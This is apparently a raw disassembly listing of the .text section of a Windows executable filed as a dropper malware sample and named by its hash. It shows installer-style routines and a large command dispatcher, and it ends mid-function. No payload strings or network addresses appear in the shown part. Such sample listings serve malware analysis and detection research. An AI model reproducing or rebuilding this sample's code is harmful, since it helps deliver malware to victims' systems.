
malware_samples/dropper/6373afd213310e56556cb1c4c274aab36b34f638964f5cde822416ba2cc5468b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	83 ec 5c             	sub    $0x5c,%esp
  401003:	83 7c 24 64 0f       	cmpl   $0xf,0x64(%esp)
  401008:	74 2f                	je     0x401039
  40100a:	83 7c 24 64 46       	cmpl   $0x46,0x64(%esp)
  40100f:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  401013:	75 0c                	jne    0x401021
  401015:	83 49 18 10          	orl    $0x10,0x18(%ecx)
  401019:	a1 18 62 47 00       	mov    0x476218,%eax
  40101e:	89 41 04             	mov    %eax,0x4(%ecx)
  401021:	51                   	push   %ecx
  401022:	ff 74 24 6c          	push   0x6c(%esp)
  401026:	ff 74 24 6c          	push   0x6c(%esp)
  40102a:	ff 74 24 6c          	push   0x6c(%esp)
  40102e:	ff 15 80 92 40 00    	call   *0x409280
  401034:	e9 61 01 00 00       	jmp    0x40119a
  401039:	53                   	push   %ebx
  40103a:	55                   	push   %ebp
  40103b:	8b 2d 30 e2 47 00    	mov    0x47e230,%ebp
  401041:	8d 44 24 24          	lea    0x24(%esp),%eax
  401045:	56                   	push   %esi
  401046:	57                   	push   %edi
  401047:	50                   	push   %eax
  401048:	ff 74 24 74          	push   0x74(%esp)
  40104c:	ff 15 78 92 40 00    	call   *0x409278
  401052:	83 64 24 10 00       	andl   $0x0,0x10(%esp)
  401057:	8b d8                	mov    %eax,%ebx
  401059:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40105d:	50                   	push   %eax
  40105e:	ff 74 24 74          	push   0x74(%esp)
  401062:	ff 15 70 92 40 00    	call   *0x409270
  401068:	8b 74 24 28          	mov    0x28(%esp),%esi
  40106c:	83 64 24 28 00       	andl   $0x0,0x28(%esp)
  401071:	8b 54 24 20          	mov    0x20(%esp),%edx
  401075:	89 74 24 74          	mov    %esi,0x74(%esp)
  401079:	e9 91 00 00 00       	jmp    0x40110f
  40107e:	0f b6 45 52          	movzbl 0x52(%ebp),%eax
  401082:	8b fe                	mov    %esi,%edi
  401084:	0f b6 4d 56          	movzbl 0x56(%ebp),%ecx
  401088:	2b fa                	sub    %edx,%edi
  40108a:	0f af c7             	imul   %edi,%eax
  40108d:	0f af ca             	imul   %edx,%ecx
  401090:	03 c1                	add    %ecx,%eax
  401092:	0f b6 4d 55          	movzbl 0x55(%ebp),%ecx
  401096:	99                   	cltd
  401097:	f7 fe                	idiv   %esi
  401099:	0f af 4c 24 20       	imul   0x20(%esp),%ecx
  40109e:	0f b6 f0             	movzbl %al,%esi
  4010a1:	0f b6 45 51          	movzbl 0x51(%ebp),%eax
  4010a5:	0f af c7             	imul   %edi,%eax
  4010a8:	c1 e6 08             	shl    $0x8,%esi
  4010ab:	03 c1                	add    %ecx,%eax
  4010ad:	0f b6 4d 54          	movzbl 0x54(%ebp),%ecx
  4010b1:	99                   	cltd
  4010b2:	f7 7c 24 74          	idivl  0x74(%esp)
  4010b6:	0f af 4c 24 20       	imul   0x20(%esp),%ecx
  4010bb:	0f b6 c0             	movzbl %al,%eax
  4010be:	0b f0                	or     %eax,%esi
  4010c0:	0f b6 45 50          	movzbl 0x50(%ebp),%eax
  4010c4:	0f af c7             	imul   %edi,%eax
  4010c7:	c1 e6 08             	shl    $0x8,%esi
  4010ca:	03 c1                	add    %ecx,%eax
  4010cc:	99                   	cltd
  4010cd:	f7 7c 24 74          	idivl  0x74(%esp)
  4010d1:	0f b6 c0             	movzbl %al,%eax
  4010d4:	0b f0                	or     %eax,%esi
  4010d6:	8d 44 24 10          	lea    0x10(%esp),%eax
  4010da:	50                   	push   %eax
  4010db:	89 74 24 18          	mov    %esi,0x18(%esp)
  4010df:	ff 15 50 90 40 00    	call   *0x409050
  4010e5:	83 44 24 28 04       	addl   $0x4,0x28(%esp)
  4010ea:	8b f0                	mov    %eax,%esi
  4010ec:	56                   	push   %esi
  4010ed:	8d 44 24 20          	lea    0x20(%esp),%eax
  4010f1:	50                   	push   %eax
  4010f2:	53                   	push   %ebx
  4010f3:	ff 15 6c 92 40 00    	call   *0x40926c
  4010f9:	56                   	push   %esi
  4010fa:	ff 15 5c 90 40 00    	call   *0x40905c
  401100:	8b 54 24 20          	mov    0x20(%esp),%edx
  401104:	8b 74 24 74          	mov    0x74(%esp),%esi
  401108:	83 c2 04             	add    $0x4,%edx
  40110b:	89 54 24 20          	mov    %edx,0x20(%esp)
  40110f:	3b d6                	cmp    %esi,%edx
  401111:	0f 8c 67 ff ff ff    	jl     0x40107e
  401117:	83 7d 58 ff          	cmpl   $0xffffffff,0x58(%ebp)
  40111b:	74 68                	je     0x401185
  40111d:	ff 75 34             	push   0x34(%ebp)
  401120:	ff 15 68 90 40 00    	call   *0x409068
  401126:	8b f0                	mov    %eax,%esi
  401128:	89 74 24 74          	mov    %esi,0x74(%esp)
  40112c:	85 f6                	test   %esi,%esi
  40112e:	74 55                	je     0x401185
  401130:	6a 01                	push   $0x1
  401132:	53                   	push   %ebx
  401133:	c7 44 24 24 10 00 00 	movl   $0x10,0x24(%esp)
  40113a:	00 
  40113b:	c7 44 24 28 08 00 00 	movl   $0x8,0x28(%esp)
  401142:	00 
  401143:	ff 15 4c 90 40 00    	call   *0x40904c
  401149:	ff 75 58             	push   0x58(%ebp)
  40114c:	53                   	push   %ebx
  40114d:	ff 15 64 90 40 00    	call   *0x409064
  401153:	8b 3d 58 90 40 00    	mov    0x409058,%edi
  401159:	56                   	push   %esi
  40115a:	53                   	push   %ebx
  40115b:	ff d7                	call   *%edi
  40115d:	68 20 08 00 00       	push   $0x820
  401162:	8b f0                	mov    %eax,%esi
  401164:	8d 44 24 20          	lea    0x20(%esp),%eax
  401168:	50                   	push   %eax
  401169:	6a ff                	push   $0xffffffff
  40116b:	68 20 62 47 00       	push   $0x476220
  401170:	53                   	push   %ebx
  401171:	ff 15 7c 92 40 00    	call   *0x40927c
  401177:	56                   	push   %esi
  401178:	53                   	push   %ebx
  401179:	ff d7                	call   *%edi
  40117b:	ff 74 24 74          	push   0x74(%esp)
  40117f:	ff 15 5c 90 40 00    	call   *0x40905c
  401185:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  401189:	50                   	push   %eax
  40118a:	ff 74 24 74          	push   0x74(%esp)
  40118e:	ff 15 74 92 40 00    	call   *0x409274
  401194:	5f                   	pop    %edi
  401195:	5e                   	pop    %esi
  401196:	5d                   	pop    %ebp
  401197:	33 c0                	xor    %eax,%eax
  401199:	5b                   	pop    %ebx
  40119a:	83 c4 5c             	add    $0x5c,%esp
  40119d:	c2 10 00             	ret    $0x10
  4011a0:	51                   	push   %ecx
  4011a1:	53                   	push   %ebx
  4011a2:	55                   	push   %ebp
  4011a3:	8b 2d 4c e2 47 00    	mov    0x47e24c,%ebp
  4011a9:	33 c9                	xor    %ecx,%ecx
  4011ab:	56                   	push   %esi
  4011ac:	57                   	push   %edi
  4011ad:	8b 3d 30 e2 47 00    	mov    0x47e230,%edi
  4011b3:	81 c7 94 00 00 00    	add    $0x94,%edi
  4011b9:	89 7c 24 10          	mov    %edi,0x10(%esp)
  4011bd:	83 3f 00             	cmpl   $0x0,(%edi)
  4011c0:	74 48                	je     0x40120a
  4011c2:	33 d2                	xor    %edx,%edx
  4011c4:	85 ed                	test   %ebp,%ebp
  4011c6:	74 3e                	je     0x401206
  4011c8:	8b 35 48 e2 47 00    	mov    0x47e248,%esi
  4011ce:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4011d2:	83 c6 04             	add    $0x4,%esi
  4011d5:	8b 5e 04             	mov    0x4(%esi),%ebx
  4011d8:	f6 c3 06             	test   $0x6,%bl
  4011db:	75 1a                	jne    0x4011f7
  4011dd:	85 ff                	test   %edi,%edi
  4011df:	74 06                	je     0x4011e7
  4011e1:	83 3c 97 00          	cmpl   $0x0,(%edi,%edx,4)
  4011e5:	74 10                	je     0x4011f7
  4011e7:	33 c0                	xor    %eax,%eax
  4011e9:	83 e3 01             	and    $0x1,%ebx
  4011ec:	40                   	inc    %eax
  4011ed:	d3 e3                	shl    %cl,%ebx
  4011ef:	d3 e0                	shl    %cl,%eax
  4011f1:	23 06                	and    (%esi),%eax
  4011f3:	3b c3                	cmp    %ebx,%eax
  4011f5:	75 0b                	jne    0x401202
  4011f7:	42                   	inc    %edx
  4011f8:	81 c6 18 40 00 00    	add    $0x4018,%esi
  4011fe:	3b d5                	cmp    %ebp,%edx
  401200:	72 d3                	jb     0x4011d5
  401202:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401206:	3b d5                	cmp    %ebp,%edx
  401208:	74 0d                	je     0x401217
  40120a:	41                   	inc    %ecx
  40120b:	83 c7 04             	add    $0x4,%edi
  40120e:	89 7c 24 10          	mov    %edi,0x10(%esp)
  401212:	83 f9 20             	cmp    $0x20,%ecx
  401215:	72 a6                	jb     0x4011bd
  401217:	5f                   	pop    %edi
  401218:	5e                   	pop    %esi
  401219:	5d                   	pop    %ebp
  40121a:	8b c1                	mov    %ecx,%eax
  40121c:	5b                   	pop    %ebx
  40121d:	59                   	pop    %ecx
  40121e:	c2 04 00             	ret    $0x4
  401221:	8b 54 24 04          	mov    0x4(%esp),%edx
  401225:	69 c2 18 40 00 00    	imul   $0x4018,%edx,%eax
  40122b:	53                   	push   %ebx
  40122c:	56                   	push   %esi
  40122d:	8b 35 48 e2 47 00    	mov    0x47e248,%esi
  401233:	8b 5c 30 08          	mov    0x8(%eax,%esi,1),%ebx
  401237:	f6 c3 02             	test   $0x2,%bl
  40123a:	74 4f                	je     0x40128b
  40123c:	57                   	push   %edi
  40123d:	8b 3d 4c e2 47 00    	mov    0x47e24c,%edi
  401243:	42                   	inc    %edx
  401244:	33 c9                	xor    %ecx,%ecx
  401246:	3b d7                	cmp    %edi,%edx
  401248:	73 40                	jae    0x40128a
  40124a:	69 c2 18 40 00 00    	imul   $0x4018,%edx,%eax
  401250:	83 c6 08             	add    $0x8,%esi
  401253:	03 f0                	add    %eax,%esi
  401255:	f6 06 02             	testb  $0x2,(%esi)
  401258:	74 03                	je     0x40125d
  40125a:	41                   	inc    %ecx
  40125b:	eb 22                	jmp    0x40127f
  40125d:	f6 06 04             	testb  $0x4,(%esi)
  401260:	74 09                	je     0x40126b
  401262:	8b c1                	mov    %ecx,%eax
  401264:	49                   	dec    %ecx
  401265:	85 c0                	test   %eax,%eax
  401267:	74 21                	je     0x40128a
  401269:	eb 14                	jmp    0x40127f
  40126b:	f6 06 10             	testb  $0x10,(%esi)
  40126e:	75 0f                	jne    0x40127f
  401270:	8b 06                	mov    (%esi),%eax
  401272:	33 c3                	xor    %ebx,%eax
  401274:	83 e0 01             	and    $0x1,%eax
  401277:	31 06                	xor    %eax,(%esi)
  401279:	8b 3d 4c e2 47 00    	mov    0x47e24c,%edi
  40127f:	42                   	inc    %edx
  401280:	81 c6 18 40 00 00    	add    $0x4018,%esi
  401286:	3b d7                	cmp    %edi,%edx
  401288:	72 cb                	jb     0x401255
  40128a:	5f                   	pop    %edi
  40128b:	5e                   	pop    %esi
  40128c:	5b                   	pop    %ebx
  40128d:	c2 04 00             	ret    $0x4
  401290:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401294:	56                   	push   %esi
  401295:	8b 35 48 e2 47 00    	mov    0x47e248,%esi
  40129b:	57                   	push   %edi
  40129c:	33 ff                	xor    %edi,%edi
  40129e:	83 f9 20             	cmp    $0x20,%ecx
  4012a1:	73 35                	jae    0x4012d8
  4012a3:	39 3d 4c e2 47 00    	cmp    %edi,0x47e24c
  4012a9:	76 2d                	jbe    0x4012d8
  4012ab:	83 c6 08             	add    $0x8,%esi
  4012ae:	8b 16                	mov    (%esi),%edx
  4012b0:	f6 c2 06             	test   $0x6,%dl
  4012b3:	75 14                	jne    0x4012c9
  4012b5:	33 c0                	xor    %eax,%eax
  4012b7:	40                   	inc    %eax
  4012b8:	d3 e0                	shl    %cl,%eax
  4012ba:	85 46 fc             	test   %eax,-0x4(%esi)
  4012bd:	74 05                	je     0x4012c4
  4012bf:	83 ca 01             	or     $0x1,%edx
  4012c2:	eb 03                	jmp    0x4012c7
  4012c4:	83 e2 fe             	and    $0xfffffffe,%edx
  4012c7:	89 16                	mov    %edx,(%esi)
  4012c9:	47                   	inc    %edi
  4012ca:	81 c6 18 40 00 00    	add    $0x4018,%esi
  4012d0:	3b 3d 4c e2 47 00    	cmp    0x47e24c,%edi
  4012d6:	72 d6                	jb     0x4012ae
  4012d8:	5f                   	pop    %edi
  4012d9:	5e                   	pop    %esi
  4012da:	c2 04 00             	ret    $0x4
  4012dd:	51                   	push   %ecx
  4012de:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4012e2:	8b 15 48 e2 47 00    	mov    0x47e248,%edx
  4012e8:	53                   	push   %ebx
  4012e9:	55                   	push   %ebp
  4012ea:	56                   	push   %esi
  4012eb:	69 f1 18 40 00 00    	imul   $0x4018,%ecx,%esi
  4012f1:	57                   	push   %edi
  4012f2:	33 ff                	xor    %edi,%edi
  4012f4:	89 54 24 10          	mov    %edx,0x10(%esp)
  4012f8:	8b df                	mov    %edi,%ebx
  4012fa:	03 f2                	add    %edx,%esi
  4012fc:	8b 46 08             	mov    0x8(%esi),%eax
  4012ff:	a8 02                	test   $0x2,%al
  401301:	74 0d                	je     0x401310
  401303:	39 5c 24 1c          	cmp    %ebx,0x1c(%esp)
  401307:	74 07                	je     0x401310
  401309:	83 e0 be             	and    $0xffffffbe,%eax
  40130c:	41                   	inc    %ecx
  40130d:	89 46 08             	mov    %eax,0x8(%esi)
  401310:	3b 0d 4c e2 47 00    	cmp    0x47e24c,%ecx
  401316:	73 58                	jae    0x401370
  401318:	69 c1 18 40 00 00    	imul   $0x4018,%ecx,%eax
  40131e:	8d 69 01             	lea    0x1(%ecx),%ebp
  401321:	89 44 24 18          	mov    %eax,0x18(%esp)
  401325:	8b 54 10 08          	mov    0x8(%eax,%edx,1),%edx
  401329:	f6 c2 02             	test   $0x2,%dl
  40132c:	74 16                	je     0x401344
  40132e:	6a 01                	push   $0x1
  401330:	51                   	push   %ecx
  401331:	e8 a7 ff ff ff       	call   0x4012dd
  401336:	8b 54 24 18          	mov    0x18(%esp),%edx
  40133a:	8b e8                	mov    %eax,%ebp
  40133c:	8b 44 24 10          	mov    0x10(%esp),%eax
  401340:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401344:	f6 c2 04             	test   $0x4,%dl
  401347:	75 31                	jne    0x40137a
  401349:	f6 c2 40             	test   $0x40,%dl
  40134c:	8d 4f 01             	lea    0x1(%edi),%ecx
  40134f:	0f 44 cf             	cmove  %edi,%ecx
  401352:	8b f9                	mov    %ecx,%edi
  401354:	83 e2 01             	and    $0x1,%edx
  401357:	74 01                	je     0x40135a
  401359:	47                   	inc    %edi
  40135a:	85 d2                	test   %edx,%edx
  40135c:	8d 43 01             	lea    0x1(%ebx),%eax
  40135f:	8b 54 24 10          	mov    0x10(%esp),%edx
  401363:	8b cd                	mov    %ebp,%ecx
  401365:	0f 44 d8             	cmove  %eax,%ebx
  401368:	3b 2d 4c e2 47 00    	cmp    0x47e24c,%ebp
  40136e:	72 a8                	jb     0x401318
  401370:	33 c0                	xor    %eax,%eax
  401372:	5f                   	pop    %edi
  401373:	5e                   	pop    %esi
  401374:	5d                   	pop    %ebp
  401375:	5b                   	pop    %ebx
  401376:	59                   	pop    %ecx
  401377:	c2 08 00             	ret    $0x8
  40137a:	85 ff                	test   %edi,%edi
  40137c:	74 17                	je     0x401395
  40137e:	8b 46 08             	mov    0x8(%esi),%eax
  401381:	85 db                	test   %ebx,%ebx
  401383:	74 05                	je     0x40138a
  401385:	83 c8 40             	or     $0x40,%eax
  401388:	eb 08                	jmp    0x401392
  40138a:	25 7f ff ff ff       	and    $0xffffff7f,%eax
  40138f:	83 c8 01             	or     $0x1,%eax
  401392:	89 46 08             	mov    %eax,0x8(%esi)
  401395:	8b c5                	mov    %ebp,%eax
  401397:	eb d9                	jmp    0x401372
  401399:	56                   	push   %esi
  40139a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40139e:	57                   	push   %edi
  40139f:	85 f6                	test   %esi,%esi
  4013a1:	78 70                	js     0x401413
  4013a3:	bf ff ff ff 7f       	mov    $0x7fffffff,%edi
  4013a8:	a1 50 e2 47 00       	mov    0x47e250,%eax
  4013ad:	6b ce 1c             	imul   $0x1c,%esi,%ecx
  4013b0:	03 c1                	add    %ecx,%eax
  4013b2:	83 38 01             	cmpl   $0x1,(%eax)
  4013b5:	74 5c                	je     0x401413
  4013b7:	50                   	push   %eax
  4013b8:	e8 96 01 00 00       	call   0x401553
  4013bd:	3b c7                	cmp    %edi,%eax
  4013bf:	74 59                	je     0x40141a
  4013c1:	50                   	push   %eax
  4013c2:	e8 43 22 00 00       	call   0x40360a
  4013c7:	8b c8                	mov    %eax,%ecx
  4013c9:	85 c9                	test   %ecx,%ecx
  4013cb:	75 04                	jne    0x4013d1
  4013cd:	41                   	inc    %ecx
  4013ce:	46                   	inc    %esi
  4013cf:	eb 07                	jmp    0x4013d8
  4013d1:	49                   	dec    %ecx
  4013d2:	8b c6                	mov    %esi,%eax
  4013d4:	8b f1                	mov    %ecx,%esi
  4013d6:	2b c8                	sub    %eax,%ecx
  4013d8:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  4013dd:	74 30                	je     0x40140f
  4013df:	a1 f0 61 47 00       	mov    0x4761f0,%eax
  4013e4:	6a 00                	push   $0x0
  4013e6:	ff 35 ec 61 47 00    	push   0x4761ec
  4013ec:	03 c1                	add    %ecx,%eax
  4013ee:	68 30 75 00 00       	push   $0x7530
  4013f3:	50                   	push   %eax
  4013f4:	a3 f0 61 47 00       	mov    %eax,0x4761f0
  4013f9:	ff 15 f0 90 40 00    	call   *0x4090f0
  4013ff:	50                   	push   %eax
  401400:	68 02 04 00 00       	push   $0x402
  401405:	ff 74 24 1c          	push   0x1c(%esp)
  401409:	ff 15 64 92 40 00    	call   *0x409264
  40140f:	85 f6                	test   %esi,%esi
  401411:	79 95                	jns    0x4013a8
  401413:	33 c0                	xor    %eax,%eax
  401415:	5f                   	pop    %edi
  401416:	5e                   	pop    %esi
  401417:	c2 08 00             	ret    $0x8
  40141a:	8b c7                	mov    %edi,%eax
  40141c:	eb f7                	jmp    0x401415
  40141e:	81 ec 14 02 00 00    	sub    $0x214,%esp
  401424:	8d 04 24             	lea    (%esp),%eax
  401427:	55                   	push   %ebp
  401428:	56                   	push   %esi
  401429:	8b b4 24 28 02 00 00 	mov    0x228(%esp),%esi
  401430:	57                   	push   %edi
  401431:	8b bc 24 2c 02 00 00 	mov    0x22c(%esp),%edi
  401438:	83 e6 01             	and    $0x1,%esi
  40143b:	50                   	push   %eax
  40143c:	81 e7 00 03 00 00    	and    $0x300,%edi
  401442:	8b c7                	mov    %edi,%eax
  401444:	83 c8 09             	or     $0x9,%eax
  401447:	50                   	push   %eax
  401448:	ff b4 24 30 02 00 00 	push   0x230(%esp)
  40144f:	ff b4 24 30 02 00 00 	push   0x230(%esp)
  401456:	e8 53 54 00 00       	call   0x4068ae
  40145b:	85 c0                	test   %eax,%eax
  40145d:	0f 85 cd 00 00 00    	jne    0x401530
  401463:	33 ed                	xor    %ebp,%ebp
  401465:	f6 84 24 2c 02 00 00 	testb  $0x2,0x22c(%esp)
  40146c:	02 
  40146d:	74 24                	je     0x401493
  40146f:	55                   	push   %ebp
  401470:	55                   	push   %ebp
  401471:	55                   	push   %ebp
  401472:	55                   	push   %ebp
  401473:	8d 44 24 20          	lea    0x20(%esp),%eax
  401477:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  40147b:	50                   	push   %eax
  40147c:	8d 44 24 28          	lea    0x28(%esp),%eax
  401480:	50                   	push   %eax
  401481:	55                   	push   %ebp
  401482:	ff 74 24 28          	push   0x28(%esp)
  401486:	ff 15 10 90 40 00    	call   *0x409010
  40148c:	3d 03 01 00 00       	cmp    $0x103,%eax
  401491:	75 79                	jne    0x40150c
  401493:	68 05 01 00 00       	push   $0x105
  401498:	8d 44 24 18          	lea    0x18(%esp),%eax
  40149c:	50                   	push   %eax
  40149d:	55                   	push   %ebp
  40149e:	ff 74 24 18          	push   0x18(%esp)
  4014a2:	8b 2d 0c 90 40 00    	mov    0x40900c,%ebp
  4014a8:	ff d5                	call   *%ebp
  4014aa:	85 c0                	test   %eax,%eax
  4014ac:	75 33                	jne    0x4014e1
  4014ae:	85 f6                	test   %esi,%esi
  4014b0:	75 5a                	jne    0x40150c
  4014b2:	ff b4 24 2c 02 00 00 	push   0x22c(%esp)
  4014b9:	8d 44 24 18          	lea    0x18(%esp),%eax
  4014bd:	50                   	push   %eax
  4014be:	ff 74 24 14          	push   0x14(%esp)
  4014c2:	e8 57 ff ff ff       	call   0x40141e
  4014c7:	85 c0                	test   %eax,%eax
  4014c9:	75 16                	jne    0x4014e1
  4014cb:	68 05 01 00 00       	push   $0x105
  4014d0:	8d 44 24 18          	lea    0x18(%esp),%eax
  4014d4:	50                   	push   %eax
  4014d5:	6a 00                	push   $0x0
  4014d7:	ff 74 24 18          	push   0x18(%esp)
  4014db:	ff d5                	call   *%ebp
  4014dd:	85 c0                	test   %eax,%eax
  4014df:	74 d1                	je     0x4014b2
  4014e1:	ff 74 24 0c          	push   0xc(%esp)
  4014e5:	ff 15 00 90 40 00    	call   *0x409000
  4014eb:	6a 03                	push   $0x3
  4014ed:	e8 8a 5c 00 00       	call   0x40717c
  4014f2:	85 c0                	test   %eax,%eax
  4014f4:	75 27                	jne    0x40151d
  4014f6:	ff b4 24 28 02 00 00 	push   0x228(%esp)
  4014fd:	ff b4 24 28 02 00 00 	push   0x228(%esp)
  401504:	ff 15 04 90 40 00    	call   *0x409004
  40150a:	eb 24                	jmp    0x401530
  40150c:	ff 74 24 0c          	push   0xc(%esp)
  401510:	ff 15 00 90 40 00    	call   *0x409000
  401516:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  40151b:	eb 13                	jmp    0x401530
  40151d:	6a 00                	push   $0x0
  40151f:	57                   	push   %edi
  401520:	ff b4 24 30 02 00 00 	push   0x230(%esp)
  401527:	ff b4 24 30 02 00 00 	push   0x230(%esp)
  40152e:	ff d0                	call   *%eax
  401530:	5f                   	pop    %edi
  401531:	5e                   	pop    %esi
  401532:	5d                   	pop    %ebp
  401533:	81 c4 14 02 00 00    	add    $0x214,%esp
  401539:	c2 0c 00             	ret    $0xc
  40153c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401540:	a1 30 e2 47 00       	mov    0x47e230,%eax
  401545:	6a 00                	push   $0x0
  401547:	ff 74 88 6c          	push   0x6c(%eax,%ecx,4)
  40154b:	e8 49 fe ff ff       	call   0x401399
  401550:	c2 04 00             	ret    $0x4
  401553:	81 ec d0 02 00 00    	sub    $0x2d0,%esp
  401559:	a1 18 62 47 00       	mov    0x476218,%eax
  40155e:	53                   	push   %ebx
  40155f:	55                   	push   %ebp
  401560:	56                   	push   %esi
  401561:	8b b4 24 e0 02 00 00 	mov    0x2e0(%esp),%esi
  401568:	33 ed                	xor    %ebp,%ebp
  40156a:	57                   	push   %edi
  40156b:	6a 07                	push   $0x7
  40156d:	59                   	pop    %ecx
  40156e:	8d 7c 24 2c          	lea    0x2c(%esp),%edi
  401572:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401576:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401578:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  40157c:	b8 00 f0 47 00       	mov    $0x47f000,%eax
  401581:	8b 54 24 34          	mov    0x34(%esp),%edx
  401585:	8b f9                	mov    %ecx,%edi
  401587:	8b f2                	mov    %edx,%esi
  401589:	c1 e7 0e             	shl    $0xe,%edi
  40158c:	03 f8                	add    %eax,%edi
  40158e:	c1 e6 0e             	shl    $0xe,%esi
  401591:	03 f0                	add    %eax,%esi
  401593:	89 4c 24 50          	mov    %ecx,0x50(%esp)
  401597:	8d 44 24 30          	lea    0x30(%esp),%eax
  40159b:	89 7c 24 18          	mov    %edi,0x18(%esp)
  40159f:	a3 04 c1 40 00       	mov    %eax,0x40c104
  4015a4:	8b dd                	mov    %ebp,%ebx
  4015a6:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4015aa:	83 c0 fe             	add    $0xfffffffe,%eax
  4015ad:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4015b1:	89 44 24 20          	mov    %eax,0x20(%esp)
  4015b5:	83 f8 44             	cmp    $0x44,%eax
  4015b8:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4015bc:	89 54 24 24          	mov    %edx,0x24(%esp)
  4015c0:	89 74 24 28          	mov    %esi,0x28(%esp)
  4015c4:	0f 87 de 1d 00 00    	ja     0x4033a8
  4015ca:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4015ce:	ff 24 9d c3 33 40 00 	jmp    *0x4033c3(,%ebx,4)
  4015d5:	51                   	push   %ecx
  4015d6:	68 c0 92 40 00       	push   $0x4092c0
  4015db:	e8 44 58 00 00       	call   0x406e24
  4015e0:	8b 44 24 38          	mov    0x38(%esp),%eax
  4015e4:	59                   	pop    %ecx
  4015e5:	59                   	pop    %ecx
  4015e6:	e9 c9 1d 00 00       	jmp    0x4033b4
  4015eb:	55                   	push   %ebp
  4015ec:	e8 5a 1f 00 00       	call   0x40354b
  4015f1:	50                   	push   %eax
  4015f2:	68 d4 92 40 00       	push   $0x4092d4
  4015f7:	e8 28 58 00 00       	call   0x406e24
  4015fc:	59                   	pop    %ecx
  4015fd:	59                   	pop    %ecx
  4015fe:	55                   	push   %ebp
  4015ff:	ff 74 24 34          	push   0x34(%esp)
  401603:	e8 09 4d 00 00       	call   0x406311
  401608:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40160d:	e9 a2 1d 00 00       	jmp    0x4033b4
  401612:	ff 05 0c 62 47 00    	incl   0x47620c
  401618:	85 c0                	test   %eax,%eax
  40161a:	74 ec                	je     0x401608
  40161c:	55                   	push   %ebp
  40161d:	ff 15 5c 92 40 00    	call   *0x40925c
  401623:	eb e3                	jmp    0x401608
  401625:	51                   	push   %ecx
  401626:	e8 df 1f 00 00       	call   0x40360a
  40162b:	8d 70 ff             	lea    -0x1(%eax),%esi
  40162e:	56                   	push   %esi
  40162f:	68 f4 92 40 00       	push   $0x4092f4
  401634:	e8 eb 57 00 00       	call   0x406e24
  401639:	59                   	pop    %ecx
  40163a:	59                   	pop    %ecx
  40163b:	55                   	push   %ebp
  40163c:	56                   	push   %esi
  40163d:	e8 57 fd ff ff       	call   0x401399
  401642:	e9 6d 1d 00 00       	jmp    0x4033b4
  401647:	55                   	push   %ebp
  401648:	e8 fe 1e 00 00       	call   0x40354b
  40164d:	50                   	push   %eax
  40164e:	68 08 93 40 00       	push   $0x409308
  401653:	e8 cc 57 00 00       	call   0x406e24
  401658:	59                   	pop    %ecx
  401659:	59                   	pop    %ecx
  40165a:	55                   	push   %ebp
  40165b:	ff 74 24 34          	push   0x34(%esp)
  40165f:	e8 ad 4c 00 00       	call   0x406311
  401664:	e9 3f 1d 00 00       	jmp    0x4033a8
  401669:	55                   	push   %ebp
  40166a:	e8 a0 1e 00 00       	call   0x40350f
  40166f:	8b f0                	mov    %eax,%esi
  401671:	56                   	push   %esi
  401672:	68 28 93 40 00       	push   $0x409328
  401677:	e8 a8 57 00 00       	call   0x406e24
  40167c:	33 c0                	xor    %eax,%eax
  40167e:	83 c4 0c             	add    $0xc,%esp
  401681:	40                   	inc    %eax
  401682:	3b f0                	cmp    %eax,%esi
  401684:	0f 4f c6             	cmovg  %esi,%eax
  401687:	50                   	push   %eax
  401688:	ff 15 08 91 40 00    	call   *0x409108
  40168e:	e9 15 1d 00 00       	jmp    0x4033a8
  401693:	68 3c 93 40 00       	push   $0x40933c
  401698:	e8 87 57 00 00       	call   0x406e24
  40169d:	8b 44 24 20          	mov    0x20(%esp),%eax
  4016a1:	59                   	pop    %ecx
  4016a2:	50                   	push   %eax
  4016a3:	ff 15 48 92 40 00    	call   *0x409248
  4016a9:	e9 fa 1c 00 00       	jmp    0x4033a8
  4016ae:	39 6c 24 38          	cmp    %ebp,0x38(%esp)
  4016b2:	75 2e                	jne    0x4016e2
  4016b4:	8b 04 8d e0 e2 47 00 	mov    0x47e2e0(,%ecx,4),%eax
  4016bb:	6a 01                	push   $0x1
  4016bd:	89 04 8d a0 e2 47 00 	mov    %eax,0x47e2a0(,%ecx,4)
  4016c4:	e8 46 1e 00 00       	call   0x40350f
  4016c9:	8b c8                	mov    %eax,%ecx
  4016cb:	8b 44 24 34          	mov    0x34(%esp),%eax
  4016cf:	51                   	push   %ecx
  4016d0:	50                   	push   %eax
  4016d1:	68 58 93 40 00       	push   $0x409358
  4016d6:	89 0c 85 e0 e2 47 00 	mov    %ecx,0x47e2e0(,%eax,4)
  4016dd:	e9 9f 0c 00 00       	jmp    0x402381
  4016e2:	8b 04 8d a0 e2 47 00 	mov    0x47e2a0(,%ecx,4),%eax
  4016e9:	89 04 8d e0 e2 47 00 	mov    %eax,0x47e2e0(,%ecx,4)
  4016f0:	e9 b3 1c 00 00       	jmp    0x4033a8
  4016f5:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  4016f9:	6a 04                	push   $0x4
  4016fb:	8b 14 8d e0 e2 47 00 	mov    0x47e2e0(,%ecx,4),%edx
  401702:	8b c2                	mov    %edx,%eax
  401704:	23 44 24 40          	and    0x40(%esp),%eax
  401708:	89 04 8d e0 e2 47 00 	mov    %eax,0x47e2e0(,%ecx,4)
  40170f:	33 c0                	xor    %eax,%eax
  401711:	85 d2                	test   %edx,%edx
  401713:	59                   	pop    %ecx
